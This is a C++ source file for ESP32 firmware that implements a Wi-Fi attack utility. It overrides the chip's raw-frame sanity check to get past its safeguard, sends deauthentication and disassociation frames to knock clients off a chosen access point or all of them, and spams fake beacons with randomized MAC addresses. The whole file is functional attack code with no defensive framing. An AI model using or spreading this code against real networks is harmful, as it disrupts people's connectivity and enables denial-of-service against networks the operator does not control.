#include "utils/WifiAttackUtil.h"
#include <esp_wifi.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337) return 1;
  return 0;
}

WifiAttackUtil::WifiAttackUtil()
{
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP("No Internet", "12345678", 1, true);
}

WifiAttackUtil::~WifiAttackUtil()
{
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  _sequenceNumber = 0;
}

esp_err_t WifiAttackUtil::_changeChannel(const uint8_t channel) noexcept
{
  if (_currentChannel == channel) return ESP_OK;
  _currentChannel = channel;
  return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

esp_err_t WifiAttackUtil::_sendPacket(const uint8_t* packet, const size_t len) noexcept
{
  return esp_wifi_80211_tx(WIFI_IF_AP, packet, len, false);
}

esp_err_t WifiAttackUtil::deauthenticate(const MacAddr bssid, const uint8_t channel)
{
  const MacAddr broadcast = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  return deauthenticate(broadcast, bssid, channel);
}

esp_err_t WifiAttackUtil::beaconSpam(const char* ssid, const uint8_t channel)
{
  esp_err_t res = _changeChannel(channel);
  if (res != ESP_OK) return res;

  // Fill SSID field (32 bytes, space-padded)
  uint8_t tmpSSID[32];
  memset(tmpSSID, 0x20, 32);
  const size_t len = strlen(ssid);
  for (size_t i = 0; i < len && i < 32; i++) tmpSSID[i] = (uint8_t)ssid[i];
  memcpy(&_beaconPacket[38], tmpSSID, 32);

  // Randomize MAC
  uint8_t mac[6];
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(0, 256);
  memcpy(&_beaconPacket[10], mac, 6);
  memcpy(&_beaconPacket[16], mac, 6);

  _beaconPacket[82] = channel;

  for (int k = 0; k < 3; k++) {
    _sendPacket(_beaconPacket, sizeof(_beaconPacket));
    vTaskDelay(1 / portTICK_RATE_MS);
  }

  return ESP_OK;
}

esp_err_t WifiAttackUtil::deauthenticate(const MacAddr ap, const MacAddr bssid, const uint8_t channel)
{
  esp_err_t res = _changeChannel(channel);
  if (res != ESP_OK) return res;

  memcpy(_deauthFrame, _deauthDefault, sizeof(_deauthDefault));
  memcpy(&_deauthFrame[4],  ap,    6);
  memcpy(&_deauthFrame[10], bssid, 6);
  memcpy(&_deauthFrame[16], bssid, 6);
  memcpy(&_deauthFrame[22], &_sequenceNumber, 2);
  _sequenceNumber++;

  res = _sendPacket(_deauthFrame, sizeof(_deauthFrame));
  if (res == ESP_OK) return ESP_OK;
  _deauthFrame[0] = 0xa0;
  return _sendPacket(_deauthFrame, sizeof(_deauthFrame));
}